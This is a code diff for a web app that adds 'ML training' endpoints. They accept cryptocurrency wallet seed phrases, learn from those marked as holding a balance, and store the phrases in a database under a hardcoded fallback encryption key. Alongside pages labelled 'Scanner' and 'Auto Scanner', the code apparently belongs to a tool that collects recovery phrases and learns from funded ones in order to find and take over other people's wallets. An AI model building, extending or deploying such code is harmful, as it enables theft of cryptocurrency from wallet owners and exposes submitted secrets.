@@ -686,6 +686,142 @@ app.post('/api/ml/reset-all', async (c) => {
   }
 })
 
+// ===== MANUAL TRAINING ENDPOINTS =====
+
+// Submit training data
+app.post('/api/ml/train', async (c) => {
+  try {
+    const db = c.env.DB
+    const encryptionKey = c.env.ENCRYPTION_KEY || 'default-dev-key-change-in-production'
+    const { seedPhrase, walletType, hasBalance, balanceUSD = 0, notes, validationData } = await c.req.json()
+    
+    if (!seedPhrase || typeof seedPhrase !== 'string') {
+      return c.json({ error: 'Seed phrase is required' }, 400)
+    }
+    
+    // Validate seed phrase
+    const words = seedPhrase.trim().split(/\s+/)
+    if (words.length !== 12 && words.length !== 24) {
+      return c.json({ error: 'Seed phrase must be 12 or 24 words' }, 400)
+    }
+    
+    // Load ML state
+    const mlState = await mlLearning.initializeMLState(db)
+    
+    // Learn from this training example
+    if (hasBalance) {
+      mlLearning.learnFromSuccess(mlState, seedPhrase, walletType, balanceUSD)
+      console.log('[ML Train] Learned from successful phrase:', words.length, 'words')
+    }
+    
+    // Update attempts
+    mlLearning.updateAttempts(mlState, 1)
+    
+    // Save ML state
+    await mlLearning.saveMLState(db, mlState)
+    
+    // Store training submission in database
+    const encryptedPhrase = await crypto.encryptData(seedPhrase, encryptionKey)
+    await db.prepare(`
+      INSERT INTO training_submissions (
+        seed_phrase, word_count, wallet_type, has_balance,
+        balance_usd, notes, validation_data, created_at
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
+    `).bind(
+      encryptedPhrase,
+      words.length,
+      walletType,
+      hasBalance ? 1 : 0,
+      balanceUSD,
+      notes || null,
+      validationData ? JSON.stringify(validationData) : null
+    ).run()
+    
+    // Get updated stats
+    const stats = mlLearning.getMLStats(mlState)
+    
+    return c.json({
+      success: true,
+      message: 'Training data submitted successfully',
+      stats: {
+        totalSuccesses: stats.totalSuccesses,
+        totalAttempts: stats.totalAttempts,
+        learnedWords: stats.learnedWords,
+        successRate: stats.successRate
+      }
+    })
+  } catch (error) {
+    console.error('[API] Submit training data error:', error)
+    return c.json({ error: 'Failed to submit training data' }, 500)
+  }
+})
+
+// Get training history
+app.get('/api/ml/training-history', async (c) => {
+  try {
+    const db = c.env.DB
+    const { limit = '10', offset = '0' } = c.req.query()
+    
+    const result = await db.prepare(`
+      SELECT 
+        id, word_count, wallet_type, has_balance,
+        balance_usd, notes, created_at
+      FROM training_submissions
+      ORDER BY created_at DESC
+      LIMIT ? OFFSET ?
+    `).bind(parseInt(limit), parseInt(offset)).all()
+    
+    return c.json({
+      success: true,
+      submissions: result.results.map(row => ({
+        id: row.id,
+        wordCount: row.word_count,
+        walletType: row.wallet_type,
+        hasBalance: row.has_balance === 1,
+        balanceUSD: row.balance_usd,
+        notes: row.notes,
+        submittedAt: row.created_at
+      })),
+      count: result.results.length
+    })
+  } catch (error) {
+    console.error('[API] Get training history error:', error)
+    return c.json({ error: 'Failed to retrieve training history' }, 500)
+  }
+})
+
+// Get training statistics
+app.get('/api/ml/training-stats', async (c) => {
+  try {
+    const db = c.env.DB
+    
+    const result = await db.prepare(`
+      SELECT 
+        COUNT(*) as total,
+        SUM(CASE WHEN has_balance = 1 THEN 1 ELSE 0 END) as with_balance,
+        AVG(word_count) as avg_word_count,
+        MIN(created_at) as first_submission,
+        MAX(created_at) as last_submission
+      FROM training_submissions
+    `).first()
+    
+    return c.json({
+      success: true,
+      stats: {
+        totalSubmissions: result?.total || 0,
+        withBalance: result?.with_balance || 0,
+        withoutBalance: (result?.total || 0) - (result?.with_balance || 0),
+        avgWordCount: result?.avg_word_count || 0,
+        firstSubmission: result?.first_submission,
+        lastSubmission: result?.last_submission
+      }
+    })
+  } catch (error) {
+    console.error('[API] Get training stats error:', error)
+    return c.json({ error: 'Failed to retrieve training statistics' }, 500)
+  }
+})
+
 // Get scan by ID
 app.get('/api/scans/:scanId', async (c) => {
   try {
@@ -805,6 +941,9 @@ app.get('/scanner', (c) => {
                     <a href="/" class="text-slate-300 hover:text-white px-3 py-2 rounded transition">Home</a>
                     <a href="/scanner" class="bg-amber-500 text-black px-4 py-2 rounded font-semibold">
                         Scanner
+                    </a>
+                    <a href="/static/training.html" class="bg-purple-500 text-white px-4 py-2 rounded font-semibold">
+                        <i class="fas fa-brain mr-1"></i> ML Training
                     </a>
                 </div>
             </div>
@@ -1221,6 +1360,11 @@ app.get('/scanner', (c) => {
   `)
 })
 
+// ===== TRAINING PAGE =====
+app.get('/training', (c) => {
+  return c.redirect('/static/training.html')
+})
+
 // ===== MAIN PAGE =====
 app.get('/', (c) => {
   return c.html(`
@@ -1256,6 +1400,9 @@ app.get('/', (c) => {
                     <a href="#analyzer" class="text-slate-300 hover:text-white px-3 py-2 rounded transition">Analyzer</a>
                     <a href="/scanner" class="bg-amber-500 hover:bg-amber-600 text-black px-4 py-2 rounded font-semibold transition">
                         Auto Scanner
+                    </a>
+                    <a href="/static/training.html" class="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded font-semibold transition">
+                        <i class="fas fa-brain mr-1"></i> Train ML
                     </a>
                 </div>
             </div>
